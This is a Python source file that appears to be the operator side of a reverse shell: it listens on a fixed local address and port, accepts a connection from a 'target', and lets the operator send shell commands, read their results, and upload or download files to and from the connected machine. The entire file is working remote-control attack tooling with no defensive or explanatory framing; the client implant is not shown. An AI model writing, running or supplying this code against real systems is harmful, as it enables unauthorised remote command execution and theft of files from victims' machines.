import socket
import json
import os
from termcolor import colored, cprint


def sender(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())


def receiver():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def upload_file(file_name):
    with open(file_name, "rb") as f:
        target.send(f.read())


def download_file(file_name):
    with open(file_name, "wb") as f:
        target.settimeout(1)
        chunk = target.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = target.recv(1024)
            except socket.timeout as err:
                break
        target.settimeout(None)


def target_communication():
    while True:
        shell_prompt = colored(f"* Shell~{ip}: ", "magenta")
        command = input(shell_prompt)
        sender(command)
        if command == "quit":
            break
        elif command == "clear":
            os.system("clear")
        elif command[:3] == "cd ":
            pass
        elif command[:8] == "download":
            download_file(command[9:])
        elif command[:6] == "upload":
            upload_file(command[7:])
        else:
            result = receiver()
            print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("192.168.0.57", 5555))
cprint("[+] Listening for Incoming Connections", "cyan")
sock.listen(5)
target, ip = sock.accept()
cprint(f"[+] Target Connected From: {str(ip)}", "green")
target_communication()
